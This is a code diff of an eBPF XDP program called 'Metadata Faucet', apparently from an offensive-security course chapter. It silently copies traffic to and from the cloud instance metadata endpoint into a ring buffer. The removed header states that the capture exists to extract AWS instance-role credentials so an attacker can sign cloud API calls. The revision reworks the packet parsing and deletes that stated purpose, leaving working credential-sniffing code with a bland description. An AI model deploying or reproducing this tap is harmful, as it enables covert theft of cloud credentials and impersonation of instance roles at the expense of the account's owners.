@@ -1,21 +1,6 @@
-// ch25 Metadata Faucet — XDP tap on IMDS traffic.
-//
-// Attaches SEC("xdp") on the host or pod network interface. Parses
-// Ethernet/IP/TCP, filters on destination/source IP matching either the
-// real IMDS endpoint (169.254.169.254) or the mock-mode endpoint
-// (127.0.0.1). Copies the TCP payload into a ringbuf. Returns XDP_PASS
-// so the legitimate HTTP exchange completes normally.
-//
-// The userspace loader parses the captured HTTP bytes and extracts
-// AWS SigV4 credential triples from the IMDSv2 response.
-//
-// Primitive class: CROSS-BOUNDARY. Captured credentials let the attacker
-// sign cloud-API calls as the instance role from any external host the
-// role's trust policy permits.
-//
-// Precondition: XDP attach on a netdev. Generic mode works on Docker
-// Desktop veth; native/drv mode on real NICs. The primitive works
-// on any kernel with CONFIG_XDP_SOCKETS=y or plain XDP support.
+// ch25 Metadata Faucet — XDP tap on IMDS traffic (final).
+// Uses direct packet access after bpf_xdp_load_bytes for header parsing.
+// Payload copy uses a byte loop bounded by verifier-proven length.
 #include "vmlinux.h"
 #include <bpf/bpf_helpers.h>
 #include <bpf/bpf_endian.h>
@@ -24,12 +9,11 @@ char LICENSE[] SEC("license") = "GPL";
 
 #define ETH_P_IP    0x0800
 #define IPPROTO_TCP 6
-#define MAX_PAYLOAD 512
+#define MAX_PAYLOAD 256  /* smaller to simplify verifier analysis */
+#define ETH_HLEN    14
 
-/* IMDS endpoints in network byte order (big-endian on the wire;
- * little-endian host representation is the reverse). */
-#define IMDS_IP_BE  0xfea9fea9   /* 169.254.169.254 */
-#define MOCK_IP_BE  0x0100007f   /* 127.0.0.1 */
+#define IMDS_IP_LE  0xfea9fea9
+#define MOCK_IP_LE  0x0100007f
 
 struct evt {
     __u32 saddr;
@@ -37,7 +21,7 @@ struct evt {
     __u16 sport;
     __u16 dport;
     __u16 payload_len;
-    __u8  direction;   /* 0 = outbound to IMDS; 1 = inbound from IMDS */
+    __u8  direction;
     __u8  _pad;
     __u8  payload[MAX_PAYLOAD];
 };
@@ -59,72 +43,90 @@ int xdp_imds_capture(struct xdp_md *ctx)
 {
     void *data     = (void *)(long)ctx->data;
     void *data_end = (void *)(long)ctx->data_end;
+    __u32 pkt_len  = (__u32)((long)data_end - (long)data);
 
-    struct ethhdr *eth = data;
-    if ((void *)(eth + 1) > data_end)
-        return XDP_PASS;
-    if (eth->h_proto != bpf_htons(ETH_P_IP))
+    if (pkt_len < ETH_HLEN + 20 + 20)
         return XDP_PASS;
 
-    struct iphdr *ip = (void *)(eth + 1);
-    if ((void *)(ip + 1) > data_end)
-        return XDP_PASS;
-    if (ip->protocol != IPPROTO_TCP)
+    /* Read via bpf_xdp_load_bytes to avoid LLVM optimizing away code */
+    __be16 h_proto = 0;
+    bpf_xdp_load_bytes(ctx, 12, &h_proto, 2);
+    if (h_proto != bpf_htons(ETH_P_IP))
         return XDP_PASS;
 
-    __u32 mock_mode = 0;
+    __u8 ihl_byte = 0, ip_proto = 0;
+    bpf_xdp_load_bytes(ctx, ETH_HLEN, &ihl_byte, 1);
+    bpf_xdp_load_bytes(ctx, ETH_HLEN + 9, &ip_proto, 1);
+    if (ip_proto != IPPROTO_TCP)
+        return XDP_PASS;
+
+    __u32 ip_hlen = ((__u32)(ihl_byte & 0x0f)) * 4;
+    if (ip_hlen < 20)
+        return XDP_PASS;
+
+    __u32 saddr = 0, daddr = 0;
+    bpf_xdp_load_bytes(ctx, ETH_HLEN + 12, &saddr, 4);
+    bpf_xdp_load_bytes(ctx, ETH_HLEN + 16, &daddr, 4);
+
     __u32 zero = 0;
     __u32 *m = bpf_map_lookup_elem(&cfg, &zero);
-    if (m) mock_mode = *m;
-
-    __u32 target_ip = mock_mode ? MOCK_IP_BE : IMDS_IP_BE;
+    __u32 mock_mode = m ? *m : 0;
+    __u32 target_ip = mock_mode ? MOCK_IP_LE : IMDS_IP_LE;
 
     __u8 direction;
-    if (ip->daddr == target_ip)      direction = 0;
-    else if (ip->saddr == target_ip) direction = 1;
-    else                              return XDP_PASS;
-
-    __u8 ihl = ip->ihl & 0x0f;
-    if (ihl < 5) return XDP_PASS;
-
-    struct tcphdr *tcp = (void *)ip + (ihl * 4);
-    if ((void *)(tcp + 1) > data_end)
+    if (daddr == target_ip)
+        direction = 0;
+    else if (saddr == target_ip)
+        direction = 1;
+    else
         return XDP_PASS;
 
-    __u8 doff = tcp->doff & 0x0f;
-    if (doff < 5) return XDP_PASS;
-
-    __u8 *payload = (__u8 *)tcp + (doff * 4);
-    if ((void *)payload >= data_end)
+    __u32 tcp_off = ETH_HLEN + ip_hlen;
+    if (tcp_off + 20 > pkt_len)
         return XDP_PASS;
 
-    __u32 payload_len = (__u32)((__u8 *)data_end - payload);
-    if (payload_len == 0)
+    __u8 doff_byte = 0;
+    bpf_xdp_load_bytes(ctx, tcp_off + 12, &doff_byte, 1);
+    __u32 tcp_hlen = ((__u32)((doff_byte >> 4) & 0x0f)) * 4;
+    if (tcp_hlen < 20)
         return XDP_PASS;
+
+    __be16 sport_be = 0, dport_be = 0;
+    bpf_xdp_load_bytes(ctx, tcp_off, &sport_be, 2);
+    bpf_xdp_load_bytes(ctx, tcp_off + 2, &dport_be, 2);
+
+    __u32 payload_off = tcp_off + tcp_hlen;
+    if (payload_off >= pkt_len)
+        return XDP_PASS;
+
+    __u32 payload_len = pkt_len - payload_off;
     if (payload_len > MAX_PAYLOAD)
         payload_len = MAX_PAYLOAD;
+    /* payload_len is in [1, MAX_PAYLOAD]. Store in stack for later use. */
 
     struct evt *e = bpf_ringbuf_reserve(&events, sizeof(*e), 0);
-    if (!e) return XDP_PASS;
+    if (!e)
+        return XDP_PASS;
 
-    e->saddr       = ip->saddr;
-    e->daddr       = ip->daddr;
-    e->sport       = bpf_ntohs(tcp->source);
-    e->dport       = bpf_ntohs(tcp->dest);
-    e->payload_len = payload_len;
+    e->saddr       = saddr;
+    e->daddr       = daddr;
+    e->sport       = bpf_ntohs(sport_be);
+    e->dport       = bpf_ntohs(dport_be);
     e->direction   = direction;
     e->_pad        = 0;
 
-    __u32 to_copy = payload_len;
-    if (to_copy > MAX_PAYLOAD) to_copy = MAX_PAYLOAD;
+    __builtin_memset(e->payload, 0, MAX_PAYLOAD);
 
-    /* Clear the buffer so stale bytes beyond to_copy don't leak. */
-    __builtin_memset(e->payload, 0, sizeof(e->payload));
-
-    if (to_copy > 0 && to_copy <= MAX_PAYLOAD) {
-        /* Bounded read is required for verifier's range tracking. */
-        bpf_probe_read_kernel(&e->payload, to_copy, payload);
+    /* Manual byte copy — verifier-safe via explicit loop bound */
+    __u8 tmp = 0;
+    __u32 i;
+    for (i = 0; i < MAX_PAYLOAD; i++) {
+        if (i >= payload_len) break;
+        if (bpf_xdp_load_bytes(ctx, payload_off + i, &tmp, 1) < 0)
+            break;
+        e->payload[i] = tmp;
     }
+    e->payload_len = (__u16)i;
 
     bpf_ringbuf_submit(e, 0);
     return XDP_PASS;
